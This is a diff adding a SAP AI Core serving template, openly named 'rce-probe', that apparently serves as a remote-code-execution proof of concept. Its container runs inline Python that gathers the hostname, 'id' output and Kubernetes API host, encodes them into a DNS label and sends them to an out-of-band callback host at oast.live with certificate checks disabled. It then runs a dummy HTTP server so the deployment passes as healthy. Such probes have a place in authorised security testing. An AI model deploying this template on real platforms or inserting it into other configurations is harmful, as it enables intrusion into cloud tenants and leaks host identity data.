@@ -1,0 +1,58 @@
+apiVersion: ai.sap.com/v1alpha1
+kind: ServingTemplate
+metadata:
+  name: rce-probe-1776192375
+  labels:
+    scenarios.ai.sap.com/id: "rce-probe"
+    ai.sap.com/version: "1776192375"
+  annotations:
+    scenarios.ai.sap.com/name: "rce-probe"
+    executables.ai.sap.com/name: "rce-probe-1776192375"
+    executables.ai.sap.com/description: "rce-poc"
+spec:
+  template:
+    apiVersion: "serving.kserve.io/v1beta1"
+    metadata:
+      annotations: |
+        autoscaling.knative.dev/target: 1
+      labels: |
+        ai.sap.com/resourcePlan: starter
+    spec: |
+      predictor:
+        minReplicas: 1
+        maxReplicas: 1
+        containers:
+        - name: kserve-container
+          image: python:3.11
+          command: ["/bin/sh", "-c"]
+          args:
+          - |
+            python3 -c "
+            import os, re, subprocess, urllib.request, ssl
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            h = subprocess.check_output(['hostname']).decode().strip()
+            id_out = subprocess.check_output(['id']).decode().strip()
+            k = os.environ.get('KUBERNETES_SERVICE_HOST', 'none')
+            print('[RCE] hostname: ' + h, flush=True)
+            print('[RCE] id: ' + id_out, flush=True)
+            print('[RCE] K8S_API_HOST: ' + k, flush=True)
+            parts = id_out.split()[:2]
+            dns_label = re.sub(r'-+', '-', re.sub(r'[^a-z0-9]', '-', '-'.join(parts).lower())).strip('-')[:50]
+            dns_url = 'http://' + dns_label + '.d7f7fjmipla8bru9umagndehoqayja3z6.oast.live/'
+            print('[RCE] DNS_OAST: ' + dns_url, flush=True)
+            try:
+                r = urllib.request.urlopen(urllib.request.Request(dns_url), timeout=15, context=ctx)
+                print('[RCE] OAST_HIT: ' + str(r.status), flush=True)
+            except Exception as e:
+                print('[RCE] OAST_ERR: ' + str(e), flush=True)
+            "
+            python3 -c "
+            import http.server
+            class H(http.server.BaseHTTPRequestHandler):
+                def do_GET(self):
+                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
+                def log_message(self, *a): pass
+            http.server.HTTPServer(('', 8080), H).serve_forever()
+            "
